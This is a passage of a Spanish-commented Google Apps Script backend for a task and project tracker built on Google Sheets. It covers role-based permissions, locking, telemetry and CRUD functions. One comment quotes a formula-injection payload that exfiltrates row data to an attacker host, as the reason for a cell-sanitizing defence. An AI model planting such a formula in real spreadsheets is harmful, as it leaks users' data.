  var slaLimits = { Alta: 2, Media: 5, Baja: 7 };
  var sla = { onTime: 0, atRisk: 0, overdue: 0 };
  tasks.forEach(function(t) {
    if (t.status === 'Listo') return;
    if (!t.creadoRaw) { sla.onTime++; return; }
    var ferSet = feriadosByCountry[(t.pais || '').toUpperCase()] || null;
    var bizDays = countBizDays(new Date(t.creadoRaw), now, ferSet);
    var limit = slaLimits[t.priority] || 5;
    if (bizDays > limit) sla.overdue++;
    else if (bizDays >= limit - 1) sla.atRisk++;
    else sla.onTime++;
  });

  // Lista de proyectos para dropdowns (solo activos + en pausa)
  var projectList = projects
    .filter(function(p){ return p.status !== 'Completado' && p.status !== 'Cancelado'; })
    .map(function(p){ return { id: p.id, nombre: p.nombre }; });

  // Filtrar `equipos` según rol — un specialist o manager no debería ver miembros
  // y emails de otros países (PII / confidencialidad organizacional).
  var visibleEquipos = equipos;
  if (role === 'specialist' || role === 'manager') {
    visibleEquipos = equipos.filter(function(e){ return e.code === user.code; });
  }

  return {
    tasks: tasks,
    historial: historial,
    kpi: kpi,
    sla: sla,
    team: team,
    countries: Object.values(countryMap),
    equipos: visibleEquipos,
    projects: projects,
    projectList: projectList,
    semana: raw.semana,
    generated: raw.generated,
    config: raw.config,
    _role: role,
    _user: { name: user.name, code: user.code, isLeader: !!user.isLeader }
  };
}

// ════════════════════════════════════════════════════════════════
// WRITE AUTHORIZATION
// ════════════════════════════════════════════════════════════════
// Convierte throws en {success:false, error} para que el frontend reciba
// Previene formula injection en Sheets. Si un valor empieza con
// =, +, -, @, tab o CR, Sheets lo evalúa como fórmula. Ej: un usuario
// que escribe '=IMPORTDATA("https://attacker.com/?d="&A1)' como nombre
// de tarea exfiltra datos de la fila al renderearla. Mitigation:
// prefijar con apóstrofo ('), que Sheets trata como texto literal y
// no muestra. Aplicar a TODO valor que viene del cliente antes de
// setValue/appendRow. Es no-op para números, booleans, Date, null.
function _sanitizeCell(v) {
  if (v == null) return v;
  if (typeof v === 'number' || typeof v === 'boolean') return v;
  if (v instanceof Date) return v;
  var s = String(v);
  if (/^[=+\-@\t\r]/.test(s)) return "'" + s;
  return s;
}
function _sanitizeRow(arr) {
  return arr.map(_sanitizeCell);
}

// siempre el mismo contrato (failureHandler deja la UI en estado raro).
// Además sirve como punto único de:
//   1) Serialización vía LockService.getDocumentLock() (30s), para que ninguna
//      mutación concurrente colisione con otra entry-point.
//   2) Invalidación de cache: en el finally se llama a invalidateCache() una
//      sola vez, así los _*Impl no necesitan invocarlo manualmente (evita
//      doble-invalidación y olvidos). Si añadís un nuevo entry-point que
//      muta, wrappealo acá; no metas invalidateCache() en el _*Impl.
// NOTA: los _*Impl pueden seguir usando LockService.getScriptLock() para
// secciones críticas read-modify-write internas (es un lock distinto del
// document lock, así que no hay deadlock; sólo redundancia barata).
function _safeMutation(fn) {
  var lock = LockService.getDocumentLock();
  try {
    lock.waitLock(30000);
  } catch (e) {
    return { success: false, error: 'Servidor ocupado, reintenta en un momento.' };
  }
  try {
    return fn();
  } catch (e) {
    return { success: false, error: (e && e.message) || String(e) };
  } finally {
    try { lock.releaseLock(); } catch (e) {}
    invalidateCache();
  }
}

// ── TELEMETRY ───────────────────────────────────────────────────
// Wrapper mínimo para entry-points públicos. Loggea email del visitante,
// nombre de la función, duración (ms), success/error y meta opcional.
// Dos sinks: console.info (Stackdriver / Apps Script Executions) y la hoja
// 'Telemetry' del spreadsheet (si existe). Re-lanza el error original para
// no alterar el comportamiento del entry-point.
function _telemetry(fnName, fn, meta) {
  var start = Date.now();
  var email = '';
  try { email = Session.getActiveUser().getEmail() || ''; } catch (e) {}
  var result, err;
  try {
    result = fn();
  } catch (e) {
    err = e;
  }
  var duration = Date.now() - start;
  var success = !err && (result == null || result.success !== false);
  var record = {
    ts: new Date().toISOString(),
    email: email,
    fn: fnName,
    duration: duration,
    success: success,
    error: err ? (err.message || String(err)) : (result && result.error) || null,
    meta: meta || null
  };
  // 1) Stackdriver vía console.info (se ve en Apps Script Executions / GCP Logging)
  try { console.info(JSON.stringify(record)); } catch (e) {}
  // 2) Hoja Telemetry (si existe). NO crearla automáticamente; el dueño la crea cuando quiera.
  try { _appendTelemetryRow(record); } catch (e) {}
  if (err) throw err;
  return result;
}

// Cómo activar: el dueño del sheet crea una hoja llamada 'Telemetry' con
// columnas: ts | email | fn | duration_ms | status | error | meta.
// Sin la hoja, el log queda solo en Stackdriver (console.info).
function _appendTelemetryRow(record) {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var ws = ss.getSheetByName('Telemetry');
  if (!ws) return; // hoja no existe → skip silencioso (no error)
  ws.appendRow([
    record.ts, record.email, record.fn, record.duration,
    record.success ? 'OK' : 'ERR',
    record.error || '', record.meta ? JSON.stringify(record.meta) : ''
  ]);
}

// Contexto actual del visitante + su rol. Se usa en cada mutation.
function _getAuthContext() {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var equipos = readEquipos(ss);
  var config = readConfig(ss);
  var auth = resolveVisitor(equipos);
  if (!auth.ok) throw new Error('No autorizado: ' + auth.message);
  var role = determineRole(auth.email, auth.user, config);
  return { email: auth.email, user: auth.user, role: role, equipos: equipos, ss: ss };
}

// Valida que el visitante pueda modificar una tarea específica.
// target = {resp, pais} (al menos estos campos). Lanza si no puede.
function _authorizeTaskWrite(ctx, target) {
  if (ctx.role === 'head') return;
  if (ctx.role === 'manager') {
    var cc = (target && target.pais) || (target ? getCountryForMember(target.resp, ctx.equipos) : '');
    if (cc && cc !== ctx.user.code) {
      throw new Error('Sin permiso: tarea de otro país (' + cc + ')');
    }
    return;
  }
  // specialist: solo sus propias tareas
  if (!target || _normalizeName(target.resp) !== _normalizeName(ctx.user.name)) {
    throw new Error('Sin permiso: solo puedes modificar tus tareas');
  }
}

// Valida que el visitante pueda modificar un proyecto específico.
// target = {responsable, pais, participantes}
function _authorizeProjectWrite(ctx, target) {
  if (ctx.role === 'head') return;
  if (ctx.role === 'manager') {
    if (target && target.pais && target.pais !== ctx.user.code) {
      throw new Error('Sin permiso: proyecto de otro país (' + target.pais + ')');
    }
    return;
  }
  // specialist: responsable o participante
  if (!target) throw new Error('Sin permiso');
  if (target.responsable === ctx.user.name) return;
  if (target.participantes && target.participantes.indexOf(ctx.user.name) >= 0) return;
  throw new Error('Sin permiso: solo puedes modificar proyectos donde participas');
}

// Lee el estado actual de una tarea desde el sheet (para validar antes de escribir).
function _readTaskById(ss, taskId) {
  var ws = ss.getSheetByName(SHEET_ACTIVO);
  var lr = ws.getLastRow();
  if (lr < 4) return null;
  var data = ws.getRange(4, 1, lr - 3, Math.min(ws.getLastColumn(), TASK_COLS)).getValues();
  for (var i = 0; i < data.length; i++) {
    if (data[i][0] == taskId) {
      return { row: i + 4, resp: data[i][2], pais: (data[i][12] || '').toString().trim() };
    }
  }
  return null;
}

function _readProjectById(ss, projId) {
  var ws = ss.getSheetByName(SHEET_PROYECTOS);
  if (!ws) return null;
  var lr = ws.getLastRow();
  if (lr < 2) return null;
  var data = ws.getRange(2, 1, lr - 1, Math.min(ws.getLastColumn(), PROJ_COLS)).getValues();
  for (var i = 0; i < data.length; i++) {
    if (data[i][0] == projId) {
      return {
        row: i + 2,
        pais: (data[i][2] || '').toString().trim(),
        responsable: (data[i][4] || '').toString().trim(),
        participantes: (data[i][12] || '').toString().split(',').map(function(s){ return s.trim(); }).filter(Boolean)
      };
    }
  }
  return null;
}

// ════════════════════════════════════════════════════════════════
// PROJECTS CRUD
// ════════════════════════════════════════════════════════════════
function readProjects(ss) {
  var ws = ss.getSheetByName(SHEET_PROYECTOS);
  if (!ws) return [];
  var lastRow = ws.getLastRow();
  if (lastRow < 2) return [];
  var lastCol = Math.min(ws.getLastColumn(), PROJ_COLS);
  var data = ws.getRange(2, 1, lastRow - 1, lastCol).getValues();
  var projects = [];
  data.forEach(function(row) {
    if (!row[1]) return;
    projects.push({
      id: row[0], nombre: row[1]||'', pais: (row[2]||'').toString().trim(),
      lider: (row[3]||'').toString().trim(), responsable: (row[4]||'').toString().trim(),
      deadline: row[5]?(row[5] instanceof Date?Utilities.formatDate(row[5],'America/Bogota','dd/MM/yyyy'):row[5].toString()):'',
      deadlineISO: row[5]?(row[5] instanceof Date?Utilities.formatDate(row[5],'America/Bogota','yyyy-MM-dd'):''):'', priority: row[6]||'Media',
      status: row[7]||'Activo',
      // Cualquier estado distinto del default 'Activo' se considera puesto manualmente y se respeta.
      statusForced: (function(){ var s=(row[7]||'').toString().trim(); return s!=='' && s!=='Activo'; })(),
      descripcion: row[8]||'', notas: row[9]||'',
      creado: row[10]? Utilities.formatDate(new Date(row[10]),'America/Bogota','dd/MM/yyyy'):'',
      semana: row[11]||'',
      participantes: (row[12]||'').toString().split(',').map(function(s){return s.trim()}).filter(Boolean),
      tipoTrabajo: (row[13]||'').toString().trim(),
      riesgo: (row[14]||'').toString().trim(),
      documentos: _parseDocs(row[15]),
      // Col 17 (índice 16): comma-separated. Si la columna aún no existe en la hoja, default [].
      contrapartesConflicto: (row[16] || '').toString().split(',').map(function(s){return s.trim();}).filter(Boolean),
      pctDone: 0, tasks: [], taskStats: {}
    });
  });
  return projects;
}

function addProject(obj) { return _safeMutation(function() { return _addProjectImpl(obj); }); }
function _addProjectImpl(obj) {
  var ctx = _getAuthContext();
  // Validar que pueda crear en este país / como este responsable
  _authorizeProjectWrite(ctx, {
    pais: obj.pais || '',
    responsable: obj.responsable || ctx.user.name,
    participantes: (obj.participantes || '').toString().split(',').map(function(s){ return s.trim(); }).filter(Boolean)
  });
  var ss = ctx.ss;
  var ws = ss.getSheetByName(SHEET_PROYECTOS);
  if (!ws) {
    ws = ss.insertSheet(SHEET_PROYECTOS);
    ws.appendRow(['ID','Nombre','País','Líder','Responsable','Deadline','Prioridad','Estado','Descripción','Notas','Creado','Semana','Participantes','TipoTrabajo','Riesgo','Documentos','ContrapartesConflicto']);
    ws.getRange(1,1,1,PROJ_COLS).setFontWeight('bold').setBackground('#FF4940').setFontColor('#FFFFFF');
    ws.setTabColor('#FF4940');
  }
  // Lock para evitar colisión de IDs entre addProject concurrentes
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  try {
    var lastRow = ws.getLastRow();
    // max(IDs existentes) + 1 — resiste borrados y mantiene IDs únicos.
    var newId = 1;
    if (lastRow >= 2) {
      var ids = ws.getRange(2, 1, lastRow - 1, 1).getValues();
      ids.forEach(function(r){ var v = parseInt(r[0], 10); if (!isNaN(v) && v >= newId) newId = v + 1; });
    }
    var equipos = readEquipos(ss);
    var pais  = obj.pais || getCountryForMember(obj.responsable, equipos);
    var lider = obj.lider || getLeaderForCountry(pais, equipos);
    // contrapartesConflicto puede llegar como array o como string CSV; serializamos a string.
    var cpc = obj.contrapartesConflicto || '';
    if (Array.isArray(cpc)) cpc = cpc.map(function(s){ return (s == null ? '' : s.toString()).trim(); }).filter(Boolean).join(', ');
    // Solo escribimos la col 17 si la hoja ya la tiene; appendRow trunca al ancho real.
    var lc = ws.getLastColumn();
    var rowVals = [
      newId, obj.nombre||'', pais, lider, obj.responsable||'',
      obj.deadline||'', obj.priority||'Media', obj.status||'Activo',
      obj.descripcion||'', obj.notas||'', new Date(), getCurrentWeekLabel(), obj.participantes||'',
      obj.tipoTrabajo||'', obj.riesgo||'', ''
    ];
    if (lc >= PROJ_CONTRAPARTES_COL) rowVals.push(cpc);
    ws.appendRow(_sanitizeRow(rowVals));
    return {success:true, id:newId, nombre:obj.nombre||''};
  } finally {
    lock.releaseLock();
    // invalidateCache() lo dispara _safeMutation en su finally; evita doble call.
  }
}

// Batch update de proyectos: aplica varios campos en una sola llamada.
// Valida permisos contra el estado actual antes de cualquier escritura.
function updateProjectFields(projId, fields) { return _safeMutation(function() { return _updateProjectFieldsImpl(projId, fields); }); }
function _updateProjectFieldsImpl(projId, fields) {
  if (!fields || typeof fields !== 'object') return { success: false, error: 'Invalid fields' };
  var ctx = _getAuthContext();
  var current = _readProjectById(ctx.ss, projId);
  if (!current) return { success: false, error: 'Project #' + projId + ' not found' };
  _authorizeProjectWrite(ctx, current);

  // Manager no puede mover el proyecto a otro país; specialist no puede
  // transferir responsabilidad ni cambiar país.
  if (ctx.role === 'manager' && fields.pais !== undefined && fields.pais !== ctx.user.code) {
    throw new Error('Sin permiso: no puedes mover el proyecto a otro país');
  }
  if (ctx.role === 'specialist') {
    if (fields.responsable !== undefined && fields.responsable !== ctx.user.name) {
      throw new Error('Sin permiso: no puedes transferir el proyecto');
    }
    if (fields.pais !== undefined && fields.pais !== current.pais) {
      throw new Error('Sin permiso: no puedes cambiar el país del proyecto');
    }
  }

  var ws = ctx.ss.getSheetByName(SHEET_PROYECTOS);
  var fieldMap = {'nombre':2,'pais':3,'lider':4,'responsable':5,'deadline':6,'priority':7,'status':8,'descripcion':9,'notas':10,'participantes':13,'tipoTrabajo':14,'riesgo':15,'contrapartesConflicto':17};
  var row = current.row;

  // Lock para serializar mutaciones concurrentes en hoja Proyectos.
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  try {
    Object.keys(fields).forEach(function(k) {
      var col = fieldMap[k];
      if (!col) return;
      var v = fields[k];
      // participantes puede llegar como array o string csv
      if (k === 'participantes' && Array.isArray(v)) v = v.join(', ');
      // contrapartesConflicto: array → csv; string → trust.
      if (k === 'contrapartesConflicto' && Array.isArray(v)) {
        v = v.map(function(s){ return (s == null ? '' : s.toString()).trim(); }).filter(Boolean).join(', ');
      }
      ws.getRange(row, col).setValue(_sanitizeCell(v));
    });
    return { success: true };
  } finally {
    lock.releaseLock();
    // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
  }
}

// ════════════════════════════════════════════════════════════════
// TASKS
// ════════════════════════════════════════════════════════════════
function readTasks(ws) {
  if (!ws) return [];
  var lastRow = ws.getLastRow(); if (lastRow < 4) return [];
  var lastCol = Math.min(ws.getLastColumn(), TASK_COLS);
  var data = ws.getRange(4, 1, lastRow - 3, lastCol).getValues();
  var tasks = [];
  data.forEach(function(row) {
    if (!row[1]) return;
    var proyVal = (row[11]||'').toString().trim();
    tasks.push({
      id:row[0], nombre:row[1]||'', resp:row[2]||'', acc:row[3]||'',
      deadline:row[4]?(row[4] instanceof Date?Utilities.formatDate(row[4],'America/Bogota','dd/MM/yyyy'):row[4].toString()):'',
      deadlineISO:row[4]?(row[4] instanceof Date?Utilities.formatDate(row[4],'America/Bogota','yyyy-MM-dd'):''):'', priority:row[5]||'Media', status:row[6]||'Pendiente',
      semana:row[7]||'',
      creado:row[8]?Utilities.formatDate(new Date(row[8]),'America/Bogota','dd/MM/yyyy'):'',
      creadoRaw:row[8]?new Date(row[8]).toISOString():null,
      cerrado:row[9]?Utilities.formatDate(new Date(row[9]),'America/Bogota','dd/MM/yyyy'):'',
      notas:row[10]||'',
      proyectoId: isNaN(parseInt(proyVal, 10)) ? '' : parseInt(proyVal, 10),
      proyecto: proyVal, // keep raw for backward compat
      pais:(row[12]||'').toString().trim(),
      lider:(row[13]||'').toString().trim(),
      tipoTrabajo:(row[14]||'').toString().trim(),
      riesgo:(row[15]||'').toString().trim(),
      documentos: _parseDocs(row[16]),
      confidencialidad: (row[17] || 'estandar').toString().trim() || 'estandar',
      // Col 19 (índice 18): single text. Default '' si la columna aún no existe.
      contraparte: (row[18] || '').toString().trim()
    });
  });
  tasks.sort(function(a,b){return (PRIO_ORDER[a.priority]||1)-(PRIO_ORDER[b.priority]||1)||(STATUS_ORDER[a.status]||2)-(STATUS_ORDER[b.status]||2)});
  return tasks;
}

function addTask(taskObj) {
  return _telemetry('addTask', function() {
    return _safeMutation(function() { return _addTaskImpl(taskObj); });
  }, { hasResp: !!(taskObj && taskObj.resp), hasProyecto: !!(taskObj && (taskObj.proyectoId || taskObj.proyecto)) });
}
function _addTaskImpl(taskObj) {
  var ctx = _getAuthContext();
  var equipos = ctx.equipos;
  var proposedResp = taskObj.resp || '';
  var proposedPais = taskObj.pais || getCountryForMember(proposedResp, equipos);
  // Validar permisos antes de escribir. Specialist solo puede asignarse a sí mismo;
  // manager solo dentro de su país; head sin restricción.
  _authorizeTaskWrite(ctx, { resp: proposedResp, pais: proposedPais });

  var ss = ctx.ss, ws = ss.getSheetByName(SHEET_ACTIVO);
  // Lock para que nextTaskId + appendRow sean atómicos frente a creaciones concurrentes.
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  try {
    var newId = nextTaskId(ss);
    var pais  = proposedPais;
    var lider = taskObj.lider || getLeaderForCountry(pais, equipos);
    // Normalizar proyectoId a entero; si no es válido, celda vacía.
    var pid = taskObj.proyectoId || taskObj.proyecto || '';
    var pidNum = parseInt(pid, 10);
    var pidCell = isNaN(pidNum) ? '' : pidNum;
    var conf = (taskObj.confidencialidad || 'estandar').toString().trim() || 'estandar';
    // Auto-prefill de notas con checklist del template si:
    //  (a) hay tipoTrabajo con plantilla en la hoja 'Templates', y
    //  (b) el usuario no escribió notas (vacío o solo whitespace).
    // Lectura lazy: readTemplates reutiliza la cache de getTemplates si está caliente.
    var notas = (taskObj.notas || '').toString();
    if (taskObj.tipoTrabajo && !notas.replace(/\s+/g, '')) {
      try {
        var templates = readTemplates(ss);
        var checklist = templates[taskObj.tipoTrabajo];
        if (checklist && checklist.length) {
          notas = checklist.map(function(it){ return '- ' + it; }).join('\n');
        }
      } catch (e) { Logger.log('addTask: template prefill skipped: ' + ((e && e.message) || e)); }
    }
    var contraparte = (taskObj.contraparte || '').toString().trim();
    // Construimos la fila al ancho real del sheet: si el usuario aún no agregó
    // la columna 17 (Documentos), 18 (Confidencialidad) o 19 (Contraparte), no las
    // escribimos (no podemos crear columnas desde acá). Si existen, se llenan default.
    var lc = ws.getLastColumn();
    var rowVals = [
      newId, taskObj.nombre||'', taskObj.resp||'', taskObj.acc||'',
      taskObj.deadline||'', taskObj.priority||'Media', taskObj.status||'Pendiente',
      taskObj.semana||getCurrentWeekLabel(), new Date(), '', notas,
      pidCell, pais, lider,
      taskObj.tipoTrabajo||'', taskObj.riesgo||''
    ];
    // Solo agregamos columnas adicionales si la hoja las tiene; si no, appendRow las omite.
    if (lc >= 17) rowVals.push(''); // Documentos
    if (lc >= 18) rowVals.push(conf); // Confidencialidad
    if (lc >= TASK_CONTRAPARTE_COL) rowVals.push(contraparte); // Contraparte
    ws.appendRow(_sanitizeRow(rowVals));
    return {success:true, id:newId};
  } finally {
    lock.releaseLock();
    // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
  }
}

// ── COMMENTS THREAD ───────────────────────────────────────────
// Hilo de comentarios por tarea. Sheet 'Comments' se auto-crea en
// el primer uso. Columnas: id (auto-incremental), task_id (matches
// SHEET_ACTIVO/HISTORIAL), author_email, author_name, ts (ISO),
// body. Auth: cualquier usuario del allowlist puede leer/escribir
// comentarios de tareas que pueda ver (no agregamos un layer extra
// — el filtrado de tareas ya restringe quién ve qué).

function _commentsSheet(ss) {
  var ws = ss.getSheetByName(SHEET_COMMENTS);
  if (ws) return ws;
  // Crear la hoja con headers
  ws = ss.insertSheet(SHEET_COMMENTS);
  ws.getRange(1, 1, 1, 6).setValues([['id', 'task_id', 'author_email', 'author_name', 'ts', 'body']]);
  ws.getRange(1, 1, 1, 6).setFontWeight('bold');
  ws.setFrozenRows(1);
  return ws;
}

function _nextCommentId(ws) {
  var lr = ws.getLastRow();
  if (lr < 2) return 1;
  var ids = ws.getRange(2, 1, lr - 1, 1).getValues();
  var max = 0;
  for (var i = 0; i < ids.length; i++) {
    var n = parseInt(ids[i][0], 10);
    if (!isNaN(n) && n > max) max = n;
  }
  return max + 1;
}

function getTaskComments(taskId) {
  return _telemetry('getTaskComments', function() {
    var ctx = _getAuthContext();
    var ws = _commentsSheet(ctx.ss);
    var lr = ws.getLastRow();
    if (lr < 2) return [];
    var data = ws.getRange(2, 1, lr - 1, 6).getValues();
    var out = [];
    var tid = String(taskId);
    for (var i = 0; i < data.length; i++) {
      var r = data[i];
      if (String(r[1]) !== tid) continue;
      out.push({
        id: r[0],
        task_id: r[1],
        author_email: r[2] || '',
        author_name: r[3] || '',
        ts: r[4] ? (r[4] instanceof Date ? r[4].toISOString() : String(r[4])) : '',
        body: r[5] || ''
      });
    }
    // Sort by ts asc (oldest first → chronological thread)
    out.sort(function(a, b) { return (a.ts || '').localeCompare(b.ts || ''); });
    return out;
  }, { taskId: taskId });
}

function addTaskComment(taskId, body) {
  return _telemetry('addTaskComment', function() {
    return _safeMutation(function() { return _addTaskCommentImpl(taskId, body); });
  }, { taskId: taskId });
}
function _addTaskCommentImpl(taskId, body) {
  var ctx = _getAuthContext();
  var trimmed = (body || '').toString().trim();
  if (!trimmed) return { success: false, error: 'Comment body required' };
  if (trimmed.length > 5000) return { success: false, error: 'Comment too long (max 5000 chars)' };
  var ws = _commentsSheet(ctx.ss);
  var lock = LockService.getScriptLock();
  try { lock.waitLock(8000); } catch (e) { throw new Error('Server busy, retry in a moment.'); }
  try {
    var newId = _nextCommentId(ws);
    var ts = new Date();
    var row = [newId, taskId, ctx.user && ctx.user.email || '', ctx.user && ctx.user.name || '', ts, trimmed];
    ws.appendRow(_sanitizeRow(row));
    return {
      success: true,
      comment: {
        id: newId,
        task_id: taskId,
        author_email: ctx.user && ctx.user.email || '',
        author_name: ctx.user && ctx.user.name || '',
        ts: ts.toISOString(),
        body: trimmed
      }
    };
  } finally {
    lock.releaseLock();
  }
}

function updateTaskField(taskId, field, value) { return _safeMutation(function() { return _updateTaskFieldImpl(taskId, field, value); }); }
function _updateTaskFieldImpl(taskId, field, value) {
  var ctx = _getAuthContext();
  var current = _readTaskById(ctx.ss, taskId);
  if (!current) return { success: false, error: 'Task #' + taskId + ' not found' };
  _authorizeTaskWrite(ctx, current);

  var fieldMap = {'nombre':2,'resp':3,'acc':4,'deadline':5,'priority':6,'status':7,'notas':11,'proyecto':12,'proyectoId':12,'pais':13,'lider':14,'tipoTrabajo':15,'riesgo':16,'confidencialidad':18,'contraparte':19};
  var col = fieldMap[field];
  if (!col) return { success: false, error: 'Invalid field: ' + field };

  // Specialist no puede reasignar resp (sacarse la tarea de encima); manager
  // sí puede reasignar dentro de su país. Chequeo extra solo si field==='resp'.
  if (field === 'resp' && ctx.role === 'specialist' && value !== ctx.user.name) {
    throw new Error('Sin permiso: no puedes reasignar tareas');
  }
  if (field === 'pais' && ctx.role === 'manager' && value !== ctx.user.code) {
    throw new Error('Sin permiso: no puedes mover tareas a otro país');
  }
  // Solo manager/head pueden cambiar el nivel de confidencialidad de una tarea.
  if (field === 'confidencialidad' && ctx.role !== 'manager' && ctx.role !== 'head') {
    throw new Error('Sin permiso: solo manager o head pueden cambiar confidencialidad');
  }

  var ws = ctx.ss.getSheetByName(SHEET_ACTIVO);
  // Normalizar proyectoId a entero (o vacío)
  if (field === 'proyectoId' || field === 'proyecto') {
    var n = parseInt(value, 10);
    value = isNaN(n) ? '' : n;
  }
  // Lock para serializar la escritura de la celda. moveToHistorial tiene su propio
  // lock interno, por eso lo invocamos FUERA del bloque (el lock de Apps Script no
  // es reentrante de forma garantizada, así evitamos cualquier deadlock).
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  var movedToHistorial = false;
  try {
    ws.getRange(current.row, col).setValue(_sanitizeCell(value));
    if (field === 'status' && value === 'Listo') {
      ws.getRange(current.row, 10).setValue(new Date());
      movedToHistorial = true;
    }
  } finally {
    lock.releaseLock();
  }
  if (movedToHistorial) {
    moveToHistorial(ctx.ss, ws, current.row);
    // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
    return { success: true, moved: true, message: 'Tarea movida a Historial' };
  }
  // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
  return { success: true };
}
// Batch update: aplica varios campos en una sola llamada.
// Si `status` es 'Listo', se aplica al final y dispara el move a Historial (los demás campos ya quedaron escritos).
function updateTaskFields(taskId, fields) {
  return _telemetry('updateTaskFields', function() {
    return _safeMutation(function() { return _updateTaskFieldsImpl(taskId, fields); });
  }, { taskId: taskId, fieldCount: (fields && typeof fields === 'object') ? Object.keys(fields).length : 0, hasStatus: !!(fields && fields.status) });
}
function _updateTaskFieldsImpl(taskId, fields) {
  if (!fields || typeof fields !== 'object') return { success: false, error: 'Invalid fields' };
  var ctx = _getAuthContext();
  var current = _readTaskById(ctx.ss, taskId);
  if (!current) return { success: false, error: 'Task #' + taskId + ' not found' };
  _authorizeTaskWrite(ctx, current);

  // Chequeos extra para reasignaciones no permitidas
  if (ctx.role === 'specialist' && fields.resp !== undefined && fields.resp !== ctx.user.name) {
    throw new Error('Sin permiso: no puedes reasignar tareas');
  }
  if (ctx.role === 'manager' && fields.pais !== undefined && fields.pais !== ctx.user.code) {
    throw new Error('Sin permiso: no puedes mover tareas a otro país');
  }
  // Solo manager/head pueden cambiar el nivel de confidencialidad de una tarea.
  if (fields.confidencialidad !== undefined && ctx.role !== 'manager' && ctx.role !== 'head') {
    throw new Error('Sin permiso: solo manager o head pueden cambiar confidencialidad');
  }

  var ws = ctx.ss.getSheetByName(SHEET_ACTIVO);
  var fieldMap = {'nombre':2,'resp':3,'acc':4,'deadline':5,'priority':6,'status':7,'notas':11,'proyecto':12,'proyectoId':12,'pais':13,'lider':14,'tipoTrabajo':15,'riesgo':16,'confidencialidad':18,'contraparte':19};
  var row = current.row;

  // Lock para serializar mutaciones. moveToHistorial se llama fuera del bloque
  // (tiene su propio lock interno; evitamos asumir reentrancia).
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  var movedToHistorial = false;
  try {
    // 1) Aplicar todos los campos menos status
    Object.keys(fields).forEach(function(k) {
      if (k === 'status') return;
      var col = fieldMap[k];
      if (!col) return;
      var v = fields[k];
      if (k === 'proyectoId' || k === 'proyecto') {
        var n = parseInt(v, 10);
        v = isNaN(n) ? '' : n;
      }
      ws.getRange(row, col).setValue(_sanitizeCell(v));
    });

    // 2) Status al final (puede disparar move a Historial)
    if (fields.status !== undefined) {
      ws.getRange(row, 7).setValue(_sanitizeCell(fields.status));
      if (fields.status === 'Listo') {
        ws.getRange(row, 10).setValue(new Date());
        movedToHistorial = true;
      }
    }
  } finally {
    lock.releaseLock();
  }
  if (movedToHistorial) {
    moveToHistorial(ctx.ss, ws, row);
    // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
    return { success: true, moved: true, message: 'Tarea movida a Historial' };
  }
  // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
  return { success: true };
}

// ════════════════════════════════════════════════════════════════
// EQUIPOS / CONFIG / HELPERS
// ════════════════════════════════════════════════════════════════
function readEquipos(ss){var ws=ss.getSheetByName(SHEET_EQUIPOS);if(!ws)return getDefaultEquipos();var lr=ws.getLastRow();if(lr<2)return getDefaultEquipos();var data=ws.getRange(2,1,lr-1,8).getValues();var eq=[];data.forEach(function(r){var c=(r[0]||'').toString().trim();if(!c)return;eq.push({code:c,country:(r[1]||'').toString().trim(),leader:(r[2]||'').toString().trim().replace(/\n/g,''),leaderEmail:(r[3]||'').toString().trim(),members:(r[4]||'').toString().split(',').map(function(s){return s.trim()}).filter(Boolean),emails:(r[5]||'').toString().split(',').map(function(s){return s.trim()}).filter(Boolean),slackChannel:(r[6]||'').toString().trim(),notes:(r[7]||'').toString().trim()})});return eq.length>0?eq:getDefaultEquipos()}
function getDefaultEquipos(){return [{code:'CO',country:'Colombia',leader:'Carlos Eduardo Fernández',leaderEmail:'',members:['Isabela Zuluaga','Nicolás Naranjo','Juan Manuel Caicedo','Juan Camilo Gallego','Valeria Rangel','David Gaviria'],emails:[],slackChannel:'',notes:''}]}
function getAllMembers(eq){var n={};eq.forEach(function(e){if(e.leader)n[e.leader]=1;e.members.forEach(function(m){n[m]=1})});return Object.keys(n).sort()}
// Cache module-level de normalizaciones: evita reprocesar miles de veces el mismo nombre
// en stats/refresh. La clave es el string crudo; el value es el normalizado.
// También cacheamos el "índice" de equipos (por identidad de array) para no retokenizar
// en cada call durante el mismo request.
var _NAME_NORM_CACHE = {};
var _EQUIPOS_INDEX_CACHE = { ref: null, idx: null };
function _normalizeName(s){
  if(s==null) return '';
  var raw = s.toString();
  if(_NAME_NORM_CACHE.hasOwnProperty(raw)) return _NAME_NORM_CACHE[raw];
  var out = raw;
  // Rango Unicode de diacríticos combinantes U+0300..U+036F. Construimos el regex con
  // \u-escapes vía RegExp() para ser independientes del encoding del archivo fuente.
  try { out = out.normalize('NFD').replace(new RegExp('[\\u0300-\\u036f]','g'),''); } catch(e) {}
  out = out.toLowerCase().replace(/\s+/g,' ').replace(/^ +| +$/g,'');
  _NAME_NORM_CACHE[raw] = out;
  return out;
}
// Construye (o reutiliza) un índice {entries:[{code,name,norm,tokens,isLeader,email}], ...}
// para una lista de equipos dada. Cacheado por identidad del array eq.
function _buildEquiposIndex(eq){
  if(_EQUIPOS_INDEX_CACHE.ref === eq && _EQUIPOS_INDEX_CACHE.idx) return _EQUIPOS_INDEX_CACHE.idx;
  var entries = [];
  for(var i=0;i<eq.length;i++){
    var team = eq[i];
    if(team.leader){
      var ln = _normalizeName(team.leader);
      entries.push({code:team.code,name:team.leader,norm:ln,tokens:ln.split(' ').filter(Boolean),isLeader:true,email:team.leaderEmail||'',order:entries.length});
    }
    var mem = team.members||[], emails = team.emails||[];
    for(var j=0;j<mem.length;j++){
      var mn = _normalizeName(mem[j]);
